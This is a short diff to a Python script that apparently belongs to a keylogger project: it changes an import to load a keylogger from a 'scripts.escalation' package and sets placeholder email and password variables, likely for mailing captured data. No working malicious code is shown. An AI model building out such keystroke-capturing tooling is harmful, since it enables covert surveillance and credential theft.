@@ -1,6 +1,6 @@
 #! /usr/bin/env python
 
-import keylogger
+from scripts.escalation import keylogger
 
 email = "email@gmail.com"
 password = "password"
